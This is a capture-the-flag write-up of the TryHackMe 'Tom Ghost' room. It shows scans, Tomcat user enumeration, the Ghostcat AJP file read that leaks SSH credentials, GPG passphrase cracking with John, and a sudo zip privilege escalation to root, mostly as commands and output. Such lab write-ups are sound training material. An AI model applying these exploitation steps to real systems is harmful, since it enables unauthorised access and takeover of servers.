# Tom Ghost  - Try Hack Me

Reference: [Tom Ghost](https://tryhackme.com/room/tomghost)

Level: Medium

---

Recognition:

```bash
┌──(kali㉿2a02-8440-6441-a02f-0a00-27ff-fe62-0f00)-[~/Documents/hacks/tomcat]
└─$ nmap -A 10.10.27.102  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-04 15:34 CET
Nmap scan report for 10.10.27.102
Host is up (0.042s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
|_  256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http       Apache Tomcat 9.0.30
|_http-title: Apache Tomcat/9.0.30
|_http-favicon: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.08 seconds
```

```bash
──(kali㉿2a02-8440-6441-a02f-0a00-27ff-fe62-0f00)-[~/Documents/hacks/tomcat]
└─$ nikto -url http://10.10.27.102:8080/
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.10.27.102
+ Target Hostname:    10.10.27.102
+ Target Port:        8080
+ Start Time:         2024-01-04 15:46:46 (GMT1)
---------------------------------------------------------------------------
+ Server: No banner retrieved
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /favicon.ico: identifies this app/server as: Apache Tomcat (possibly 5.5.26 through 8.0.15), Alfresco Community. See: https://en.wikipedia.org/wiki/Favicon
+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS .
+ HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ /examples/servlets/index.html: Apache Tomcat default JSP pages present.
+ /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2104
+ /manager/manager-howto.html: Tomcat documentation found. See: CWE-552
+ /manager/html: Default Tomcat Manager / Host Manager interface found.
+ /host-manager/html: Default Tomcat Manager / Host Manager interface found.
+ /manager/status: Default Tomcat Server Status interface found.
+ /host-manager/status: Default Tomcat Server Status interface found.
+ 8074 requests: 0 error(s) and 13 item(s) reported on remote host
+ End Time:           2024-01-04 15:52:32 (GMT1) (346 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Apache is often vulnerable when it's not well configured. Using Metasploit we'll be trying to enumerate the user. 

```bash
msf6 auxiliary(scanner/http/tomcat_enum) > exploit

[*] http://10.10.27.102:8080/manager - Checking j_security_check...
[*] http://10.10.27.102:8080/manager - Server returned: 302
[*] http://10.10.27.102:8080/manager - Apache Tomcat - Trying name: 'admin'
[+] http://10.10.27.102:8080/manager - Apache Tomcat admin found 
[*] http://10.10.27.102:8080/manager - Apache Tomcat - Trying name: 'manager'
[+] http://10.10.27.102:8080/manager - Apache Tomcat manager found 
[*] http://10.10.27.102:8080/manager - Apache Tomcat - Trying name: 'role1'
[+] http://10.10.27.102:8080/manager - Apache Tomcat role1 found 
[*] http://10.10.27.102:8080/manager - Apache Tomcat - Trying name: 'role'
[+] http://10.10.27.102:8080/manager - Apache Tomcat role found 
[*] http://10.10.27.102:8080/manager - Apache Tomcat - Trying name: 'root'
[+] http://10.10.27.102:8080/manager - Apache Tomcat root found 
[*] http://10.10.27.102:8080/manager - Apache Tomcat - Trying name: 'tomcat'
[+] http://10.10.27.102:8080/manager - Apache Tomcat tomcat found 
[*] http://10.10.27.102:8080/manager - Apache Tomcat - Trying name: 'both'
[+] http://10.10.27.102:8080/manager - Apache Tomcat both found 
[*] http://10.10.27.102:8080/manager - Apache Tomcat - Trying name: 'QCC'
[+] http://10.10.27.102:8080/manager - Apache Tomcat QCC found 
[*] http://10.10.27.102:8080/manager - Apache Tomcat - Trying name: 'j2deployer'
[+] http://10.10.27.102:8080/manager - Apache Tomcat j2deployer found 
[*] http://10.10.27.102:8080/manager - Apache Tomcat - Trying name: 'ovwebusr'
[+] http://10.10.27.102:8080/manager - Apache Tomcat ovwebusr found 
[*] http://10.10.27.102:8080/manager - Apache Tomcat - Trying name: 'cxsdk'
[+] http://10.10.27.102:8080/manager - Apache Tomcat cxsdk found 
[*] http://10.10.27.102:8080/manager - Apache Tomcat - Trying name: 'ADMIN'
[+] http://10.10.27.102:8080/manager - Apache Tomcat ADMIN found 
[*] http://10.10.27.102:8080/manager - Apache Tomcat - Trying name: 'xampp'
[+] http://10.10.27.102:8080/manager - Apache Tomcat xampp found 
[+] http://10.10.27.102:8080/manager - Users found: ADMIN, QCC, admin, both, cxsdk, j2deployer, manager, ovwebusr, role, role1, root, tomcat, xampp
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Ok but the Apache login is only allowed on the hosting device so it's useless to spend time here. With the recognition scan we've seen that there's also an AJP instance living on port 8009. Let's search if there's an exploit for this.

```bash
┌──(kali㉿2a02-8440-6441-a02f-0a00-27ff-fe62-0f00)-[~/Documents/hacks/tomcat]
└─$ searchsploit tomcat apache AJP
------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                      |  Path
------------------------------------------------------------------------------------ ---------------------------------
Apache Tomcat - AJP 'Ghostcat File Read/Inclusion                                   | multiple/webapps/48143.py
Apache Tomcat - AJP 'Ghostcat' File Read/Inclusion (Metasploit)                     | multiple/webapps/49039.rb
------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

A vulnerability exists for this instance so let's using it with Metasploit.

```bash
msf6 > search ghostcat

Matching Modules
================

   #  Name                                  Disclosure Date  Rank    Check  Description
   -  ----                                  ---------------  ----    -----  -----------
   0  auxiliary/admin/http/tomcat_ghostcat  2020-02-20       normal  Yes    Apache Tomcat AJP File Read


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/admin/http/tomcat_ghostcat

msf6 > use auxiliary/admin/http/tomcat_ghostcat
msf6 auxiliary(admin/http/tomcat_ghostcat) > show options

Module options (auxiliary/admin/http/tomcat_ghostcat):

   Name      Current Setting   Required  Description
   ----      ---------------   --------  -----------
   FILENAME  /WEB-INF/web.xml  yes       File name
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/b
                                         asics/using-metasploit.html
   RPORT     8009              yes       The Apache JServ Protocol (AJP) port (TCP)


View the full module info with the info, or info -d command.

msf6 auxiliary(admin/http/tomcat_ghostcat) > set RHOSTS 10.10.27.102
RHOSTS => 10.10.27.102
msf6 auxiliary(admin/http/tomcat_ghostcat) > exploit
[*] Running module against 10.10.27.102
<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to GhostCat
	skyfuck:8730281lkjlkjdqlksalks
  </description>

</web-app>

[+] 10.10.27.102:8009 - File contents save to: /home/kali/.msf4/loot/20240104155752_default_10.10.27.102_WEBINFweb.xml_837237.txt
[*] Auxiliary module execution completed
```

We've obtained the creditentials of a session on the target device:

```
login:skyfuck
password:8730281lkjlkjdqlksalks
```

So we ssh into the device and redeem the first flag:

```bash
skyfuck@ubuntu:~$ find / -type f -name "user.txt" 2>/dev/null
/home/merlin/user.txt

skyfuck@ubuntu:~$ cat /home/merlin/user.txt
THM{GhostCat_1s_so_cr4sy}

skyfuck@ubuntu:~$ ls -la
total 40
drwxr-xr-x 3 skyfuck skyfuck 4096 Jan  4 06:59 .
drwxr-xr-x 4 root    root    4096 Mar 10  2020 ..
-rw------- 1 skyfuck skyfuck  136 Mar 10  2020 .bash_history
-rw-r--r-- 1 skyfuck skyfuck  220 Mar 10  2020 .bash_logout
-rw-r--r-- 1 skyfuck skyfuck 3771 Mar 10  2020 .bashrc
drwx------ 2 skyfuck skyfuck 4096 Jan  4 06:59 .cache
-rw-rw-r-- 1 skyfuck skyfuck  394 Mar 10  2020 credential.pgp
-rw-r--r-- 1 skyfuck skyfuck  655 Mar 10  2020 .profile
-rw-rw-r-- 1 skyfuck skyfuck 5144 Mar 10  2020 tryhackme.asc
```

It's seems like there a GPG message stored here with the name of `credential.pgp`. The PGP key `tryhackme.asc` but we're missing a passphrase.

We'll be searching for the passphraase using John: 

```bash
┌──(kali㉿2a02-8440-6441-a02f-0a00-27ff-fe62-0f00)-[~/Documents/hacks/tomcat]
└─$ gpg2john pgp > translate. txt                                                    

File pgp

┌──(kali㉿2a02-8440-6441-a02f-0a00-27ff-fe62-0f00)-[~/Documents/hacks/tomcat]
└─$ cat translate.txt 
tryhackme:$gpg$*17*54*3072*713ee3f57cc950f8f89155679abe2476c62bbd286ded0e049f886d32d2b9eb06f482e9770c710abc2903f1ed70af6fcc22f5608760be*3*254*2*9*16*0c99d5dae8216f2155ba2abfcc71f818*65536*c8f277d2faf97480:::tryhackme <stuxnet@tryhackme.com>::pgp
                                                                                                             
┌──(kali㉿2a02-8440-6441-a02f-0a00-27ff-fe62-0f00)-[~/Documents/hacks/tomcat]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt translate.txt
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65536 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alexandru        (tryhackme)     
1g 0:00:00:00 DONE (2024-01-04 16:26) 2.325g/s 2493p/s 2493c/s 2493C/s theresa..alexandru
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

So the passphrase is the following one: `alexandru`

```bash
skyfuck@ubuntu:~$ gpg -d credential.pgp 

You need a passphrase to unlock the secret key for
user: "tryhackme <stuxnet@tryhackme.com>"
1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11 (main key ID C6707170)

gpg: gpg-agent is not available in this session
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
gpg: encrypted with 1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11
      "tryhackme <stuxnet@tryhackme.com>"
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j

skyfuck@ubuntu:~$ su merlin
Password: 

merlin@ubuntu:/home$ sudo -l
Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
```

We're now logged as Merlin and we have to right to run zip with root rights. Using the folowing link https://www.hackingarticles.in/linux-for-pentester-zip-privilege-escalation/ we will exploit this to become admin.

```bash
merlin@ubuntu:~$ touch 2.txt
merlin@ubuntu:~$ sudo zip 1.zip 2.txt -T --unzip-command="sh -c /bin/bash"
  adding: 2.txt (stored 0%)
root@ubuntu:~# whoami
root
root@ubuntu:~# sudo -l

root@ubuntu:/# cd root/
root@ubuntu:/root# ls
root.txt  ufw
root@ubuntu:/root# cat root.txt
THM{Z1P_1S_FAKE}
```
